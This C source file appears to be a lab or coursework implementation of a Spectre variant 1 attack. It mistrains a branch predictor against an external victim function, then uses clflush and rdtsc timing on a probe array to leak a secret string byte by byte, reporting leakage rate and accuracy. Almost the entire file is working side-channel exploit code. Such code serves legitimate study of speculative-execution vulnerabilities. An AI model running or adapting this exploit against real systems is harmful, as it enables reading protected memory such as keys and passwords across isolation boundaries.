#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>
#include <time.h>

// External references
extern unsigned int array1_size;
extern uint8_t array1[16];           
extern uint8_t array2[256 * 4096];   
extern char *secret; 
extern void victim_function(intptr_t x);

// Based on your Eustis results (32 hit / 616 miss)
#define CACHE_HIT_THRESHOLD 120 

void read_byte(intptr_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, mix_i;
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) results[i] = 0;

    for (tries = 999; tries > 0; tries--) {
        // 1. Flush array2 from cache
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 4096]);

        // 2. Training Loop: 30 iterations (29 safe, 1 malicious)
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 500; z++); // Wait for flush to settle

            // Bitmask trick to avoid a branch in the attacker's own code
            // (j % 30) != 0 is 1 for j=29..1, and 0 for j=0
            intptr_t x = ((j % 30) != 0) ? 0 : malicious_x;
            
            _mm_mfence(); // Ensure flush and x-calculation are done
            victim_function(x);
        }

        // 3. Measure timing for all 256 possible byte values
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255; // Prevent prefetcher
            addr = &array2[mix_i * 4096];
            
            _mm_lfence();              // Serialize
            time1 = __rdtsc();         // Start timer
            junk = *addr;              // Memory access
            _mm_lfence();              // Serialize again
            time2 = __rdtsc() - time1; // End timer

            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % 16])
                results[mix_i]++; 
        }

        // Find the top two results
        j = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] > results[j]) j = i;
        }
        if (results[j] > 10) break; 
    }
    value[0] = (uint8_t)j; score[0] = results[j];
}

int main() {
    intptr_t malicious_x = (intptr_t)((char*)secret - (char*)array1);
    uint8_t value[2];
    int score[2];
    int len=strlen(secret);
    int correct_leaks=0;
    
    struct timespec start, end;

    memset(array2, 1, sizeof(array2));

    printf("--- Eustis Hardened Spectre Attack ---\n");
    printf("Offset: %ld | Threshold: %d\n\n", (long)malicious_x, CACHE_HIT_THRESHOLD);

    clock_gettime(CLOCK_MONOTONIC, &start);
    
    for (int i = 0; i < len; i++) { 
        read_byte(malicious_x++, value, score);
        if(value[0]==(uint8_t)secret[i]){
          correct_leaks++;
        } 
        printf("Index %02d: Found '%c' (0x%02X) score=%d %s\n", i, 
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), value[0], score[0], (value[0] == (uint8_t)secret[i] ? "[OK]" : "[FAIL]"));
    }
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    double total_time = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    
    double leakage_rate = (double)len / total_time; 
    double accuracy = ((double)correct_leaks / len) * 100.0;

    printf("\n--- Performance Metrics ---\n");
    printf("Total Time:    %.4f seconds\n", total_time);
    printf("Leakage Rate:  %.2f bytes/sec\n", leakage_rate);
    printf("Accuracy     : %.2f%% (%d/%d bytes correct)\n", accuracy, correct_leaks, len);
    //printf("Accuracy:      %.1f%%\n", accuracy);
    
    return 0;
}
